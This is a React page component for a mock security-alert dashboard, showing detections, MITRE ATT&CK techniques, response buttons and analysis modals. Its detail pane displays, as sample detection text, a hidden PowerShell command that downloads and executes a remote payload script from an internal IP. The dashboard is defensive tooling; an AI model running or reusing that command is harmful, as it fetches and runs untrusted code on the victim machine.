import { useState, lazy, Suspense } from 'react';
import { AlertTable, Alert } from '../components/crowdstrike/AlertTable';
import { Filter, X, Search, FileCode, Download } from 'lucide-react';
import BulkActionBar from '../components/BulkActionBar';

const EventSearch = lazy(() => import('../components/EventSearch'));
const FileAnalysis = lazy(() => import('../components/FileAnalysis'));
const SSLAnalysis = lazy(() => import('../components/SSLAnalysis'));
const DNSIntelligence = lazy(() => import('../components/DNSIntelligence'));

export default function Alerts() {
  const [selectedAlertId, setSelectedAlertId] = useState<string | number | null>(null);
  const [activeView, setActiveView] = useState<'alerts' | 'search' | 'files'>('alerts');
  const [activeAnalysis, setActiveAnalysis] = useState<'file' | 'ssl' | 'dns' | null>(null);
  const [selectedAlerts, setSelectedAlerts] = useState(new Set<string | number>());

  // Mock Data
  const alerts: Alert[] = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15].map((i) => ({
    id: i,
    severity: i % 4 === 0 ? 'critical' : i % 3 === 0 ? 'high' : i % 2 === 0 ? 'medium' : 'low',
    title: i % 4 === 0 ? 'Ransomware Activity Detected' : i % 3 === 0 ? 'Suspicious PowerShell Execution' : 'Port Scan Detected',
    host: `WKSTN-FIN-0${i}`,
    time: `${i * 12}m ago`,
    status: i < 5 ? "NEW" : "IN PROGRESS",
    mitre: i % 4 === 0 
      ? [{ id: 'T1486', name: 'Data Encrypted for Impact', url: 'https://attack.mitre.org/techniques/T1486/' }]
      : i % 3 === 0 
        ? [{ id: 'T1059.001', name: 'PowerShell', url: 'https://attack.mitre.org/techniques/T1059/001/' }]
        : [{ id: 'T1046', name: 'Network Service Scanning', url: 'https://attack.mitre.org/techniques/T1046/' }]
  }));

  const selectedAlert = alerts.find(a => a.id === selectedAlertId);

  const handleExportAlerts = () => {
    const dataToExport = selectedAlerts.size > 0
      ? alerts.filter(a => selectedAlerts.has(a.id))
      : alerts;
    
    const blob = new Blob([JSON.stringify(dataToExport, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `alerts-${Date.now()}.json`;
    a.click();
  };

  const toggleSelectAll = () => {
    if (selectedAlerts.size === alerts.length) {
      setSelectedAlerts(new Set());
    } else {
      setSelectedAlerts(new Set(alerts.map(a => a.id)));
    }
  };

  const toggleSelectAlert = (alertId: string | number) => {
    const newSelected = new Set(selectedAlerts);
    if (newSelected.has(alertId)) {
      newSelected.delete(alertId);
    } else {
      newSelected.add(alertId);
    }
    setSelectedAlerts(newSelected);
  };

  return (
    <div className="h-full flex flex-col gap-4">
      {/* Bulk Action Bar */}
      {selectedAlerts.size > 0 && (
        <BulkActionBar
          selectedCount={selectedAlerts.size}
          totalCount={alerts.length}
          onExport={handleExportAlerts}
          onClear={() => setSelectedAlerts(new Set())}
          actions={[
            {
              label: 'Assign',
              onClick: () => console.log('Assign alerts')
            },
            {
              label: 'Change Status',
              onClick: () => console.log('Change status')
            }
          ]}
        />
      )}

      {/* Sub-Navigation Tabs */}
      <div className="flex items-center gap-2 bg-[var(--bg-panel)] p-2 border border-[var(--border-subtle)] rounded">
        <button
          onClick={() => setActiveView('alerts')}
          className={`flex items-center gap-2 px-4 py-2 rounded text-sm font-medium transition-colors ${
            activeView === 'alerts'
              ? 'bg-[var(--sev-info)] text-white'
              : 'bg-[var(--bg-hover)] text-[var(--text-secondary)] hover:text-[var(--text-primary)]'
          }`}
        >
          <Filter className="w-4 h-4" />
          Detections
        </button>
        <button
          onClick={() => setActiveView('search')}
          className={`flex items-center gap-2 px-4 py-2 rounded text-sm font-medium transition-colors ${
            activeView === 'search'
              ? 'bg-[var(--sev-info)] text-white'
              : 'bg-[var(--bg-hover)] text-[var(--text-secondary)] hover:text-[var(--text-primary)]'
          }`}
        >
          <Search className="w-4 h-4" />
          Event Search
        </button>
        <button
          onClick={() => setActiveView('files')}
          className={`flex items-center gap-2 px-4 py-2 rounded text-sm font-medium transition-colors ${
            activeView === 'files'
              ? 'bg-[var(--sev-info)] text-white'
              : 'bg-[var(--bg-hover)] text-[var(--text-secondary)] hover:text-[var(--text-primary)]'
          }`}
        >
          <FileCode className="w-4 h-4" />
          File Analysis
        </button>
      </div>

      {/* Alerts View */}
      {activeView === 'alerts' && (
        <>
          {/* Filter Bar */}
          <div className="flex justify-between items-center bg-[var(--bg-panel)] p-4 border border-[var(--border-subtle)] rounded">
            <div className="flex items-center gap-4">
              <h2 className="text-lg font-semibold text-[var(--text-primary)]">Detections</h2>
              <div className="h-6 w-px bg-[var(--border-subtle)]" />
              <div className="flex gap-2">
                <button className="px-3 py-1.5 bg-[var(--bg-hover)] rounded text-xs text-[var(--text-secondary)] border border-[var(--border-subtle)] flex items-center gap-2 hover:text-[var(--text-primary)] transition-colors">
                  <Filter className="w-3 h-3" />
                  Severity: All
                </button>
                <button className="px-3 py-1.5 bg-[var(--bg-hover)] rounded text-xs text-[var(--text-secondary)] border border-[var(--border-subtle)] hover:text-[var(--text-primary)] transition-colors">
                  Status: New
                </button>
                <button className="px-3 py-1.5 bg-[var(--bg-hover)] rounded text-xs text-[var(--text-secondary)] border border-[var(--border-subtle)] hover:text-[var(--text-primary)] transition-colors">
                  Time: Last 24h
                </button>
              </div>
            </div>
            <div className="text-xs text-[var(--text-secondary)]">
              Showing {alerts.length} items
            </div>
          </div>

          {/* Split View Content */}
          <div className="flex-1 flex gap-4 overflow-hidden">
            {/* Left: Alert List */}
            <div className={`flex-1 transition-all duration-300 ${selectedAlertId ? 'w-1/2' : 'w-full'}`}>
              <AlertTable 
                alerts={alerts}
                selectedRowId={selectedAlertId}
                onSelect={setSelectedAlertId}
              />
            </div>

            {/* Right: Details Pane (Visible when selected) */}
            {selectedAlertId && selectedAlert && (
              <div className="w-[600px] bg-[var(--bg-panel)] border border-[var(--border-subtle)] rounded flex flex-col animate-in slide-in-from-right-4 duration-200">
                <div className="p-4 border-b border-[var(--border-subtle)] flex justify-between items-start">
                  <div>
                    <div className="flex items-center gap-2 mb-2">
                      <div className={`w-2 h-2 rounded-full bg-[var(--sev-${selectedAlert.severity})]`} />
                      <span className="text-xs font-mono text-[var(--text-secondary)] uppercase tracking-wider">{selectedAlert.severity}</span>
                    </div>
                    <h3 className="text-lg font-semibold text-[var(--text-primary)]">{selectedAlert.title}</h3>
                  </div>
                  <button 
                    onClick={() => setSelectedAlertId(null)}
                    className="p-1 hover:bg-[var(--bg-hover)] rounded text-[var(--text-secondary)]"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>
                
                <div className="p-6 overflow-y-auto flex-1 space-y-6">
                  {/* Context Section */}
                  <div className="grid grid-cols-2 gap-4">
                    <div className="p-3 bg-[var(--bg-app)] rounded border border-[var(--border-subtle)]">
                      <div className="text-xs text-[var(--text-secondary)] uppercase mb-1">Host</div>
                      <div className="text-sm font-mono text-[var(--text-primary)]">{selectedAlert.host}</div>
                    </div>

                  {/* MITRE ATT&CK Context */}
                  {selectedAlert.mitre && (
                    <div>
                      <h4 className="text-xs font-bold text-[var(--text-secondary)] uppercase mb-3">MITRE ATT&CK TTPs</h4>
                      <div className="flex flex-wrap gap-2">
                        {selectedAlert.mitre.map((technique: any) => (
                          <a 
                            key={technique.id}
                            href={technique.url}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="px-2 py-1 bg-[var(--bg-hover)] border border-[var(--border-subtle)] rounded text-xs font-mono text-[var(--text-primary)] hover:border-[var(--sev-info)] hover:text-[var(--sev-info)] transition-colors flex items-center gap-2"
                          >
                            <span className="font-bold text-[var(--sev-info)]">{technique.id}</span>
                            <span>{technique.name}</span>
                          </a>
                        ))}
                      </div>
                    </div>
                  )}
                    <div className="p-3 bg-[var(--bg-app)] rounded border border-[var(--border-subtle)]">
                      <div className="text-xs text-[var(--text-secondary)] uppercase mb-1">Time</div>
                      <div className="text-sm font-mono text-[var(--text-primary)]">{selectedAlert.time}</div>
                    </div>
                  </div>

                  {/* Actions */}
                  <div>
                    <h4 className="text-xs font-bold text-[var(--text-secondary)] uppercase mb-3">Response Actions</h4>
                    <div className="flex gap-3">
                      <button className="flex-1 py-2 bg-[var(--sev-critical)] text-white rounded text-sm font-medium hover:opacity-90 transition-opacity">
                        Isolate Host
                      </button>
                      <button className="flex-1 py-2 bg-[var(--bg-hover)] text-[var(--text-primary)] border border-[var(--border-subtle)] rounded text-sm font-medium hover:bg-[var(--border-subtle)] transition-colors">
                        View Process Tree
                      </button>
                    </div>
                  </div>

                  {/* Deep Analysis */}
                  <div className="deep-analysis-section">
                    <h4 className="text-xs font-bold text-[var(--text-secondary)] uppercase mb-3">Deep Analysis</h4>
                    <div className="flex gap-3">
                      <button 
                        className="flex-1 py-2 bg-[var(--bg-hover)] text-[var(--text-primary)] border border-[var(--border-subtle)] rounded text-sm font-medium hover:bg-[var(--border-subtle)] transition-colors flex items-center justify-center gap-2"
                        onClick={() => setActiveAnalysis('file')}
                      >
                        <FileCode className="w-4 h-4" /> File Analysis
                      </button>
                      <button 
                        className="flex-1 py-2 bg-[var(--bg-hover)] text-[var(--text-primary)] border border-[var(--border-subtle)] rounded text-sm font-medium hover:bg-[var(--border-subtle)] transition-colors flex items-center justify-center gap-2"
                        onClick={() => setActiveAnalysis('dns')}
                      >
                        <Search className="w-4 h-4" /> DNS Intel
                      </button>
                      <button 
                        className="flex-1 py-2 bg-[var(--bg-hover)] text-[var(--text-primary)] border border-[var(--border-subtle)] rounded text-sm font-medium hover:bg-[var(--border-subtle)] transition-colors flex items-center justify-center gap-2"
                        onClick={() => setActiveAnalysis('ssl')}
                      >
                        <Filter className="w-4 h-4" /> SSL/TLS
                      </button>
                    </div>
                  </div>
                
                  {/* Details */}
                  <div>
                    <h4 className="text-xs font-bold text-[var(--text-secondary)] uppercase mb-3">Detection Details</h4>
                    <div className="text-sm text-[var(--text-secondary)] leading-relaxed">
                      <p className="mb-2">
                        The sensor detected a suspicious PowerShell command execution on <strong>{selectedAlert.host}</strong>.
                        The command attempted to download an executable from an external IP address known for hosting malware.
                      </p>
                      <code className="block p-3 bg-[var(--bg-app)] rounded border border-[var(--border-subtle)] font-mono text-xs text-[var(--text-primary)] overflow-x-auto">
                        powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.100/payload.ps1'))"
                      </code>
                    </div>
                  </div>
                </div>
                
                <div className="p-4 border-t border-[var(--border-subtle)] bg-[var(--bg-app)]">
                  <div className="flex justify-between items-center text-xs text-[var(--text-secondary)]">
                    <span>Alert ID: {selectedAlert.id}</span>
                    <span className="px-2 py-1 bg-[var(--bg-hover)] rounded border border-[var(--border-subtle)]">Status: {selectedAlert.status}</span>
                  </div>
                </div>
              </div>
            )}
          </div>
        </>
      )}

      {/* Event Search View */}
      {activeView === 'search' && (
        <div className="flex-1 overflow-hidden">
          <Suspense fallback={<div className="h-full bg-[var(--bg-panel)] animate-pulse rounded" />}>
            <EventSearch />
          </Suspense>
        </div>
      )}

      {/* File Analysis View */}
      {activeView === 'files' && (
        <div className="flex-1 overflow-hidden">
          <Suspense fallback={<div className="h-full bg-[var(--bg-panel)] animate-pulse rounded" />}>
            <FileAnalysis />
          </Suspense>
        </div>
      )}

      {/* Stacked Modals for Deep Analysis */}
      {activeAnalysis && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-[1100] flex items-center justify-center p-8">
          <div className="bg-[var(--bg-app)] w-full h-full max-w-6xl rounded-lg shadow-2xl border border-[var(--border-subtle)] flex flex-col overflow-hidden">
            <div className="p-4 border-b border-[var(--border-subtle)] flex justify-between items-center bg-[var(--bg-panel)]">
              <h2 className="text-lg font-semibold">
                {activeAnalysis === 'file' && 'File Analysis'}
                {activeAnalysis === 'dns' && 'DNS Intelligence'}
                {activeAnalysis === 'ssl' && 'SSL/TLS Inspection'}
              </h2>
              <button 
                className="p-2 hover:bg-[var(--bg-hover)] rounded-full transition-colors"
                onClick={() => setActiveAnalysis(null)}
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="flex-1 overflow-hidden relative">
              <Suspense fallback={<div className="h-full w-full flex items-center justify-center">Loading...</div>}>
                {activeAnalysis === 'file' && <FileAnalysis onClose={() => setActiveAnalysis(null)} />}
                {activeAnalysis === 'dns' && <DNSIntelligence />}
                {activeAnalysis === 'ssl' && <SSLAnalysis />}
              </Suspense>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

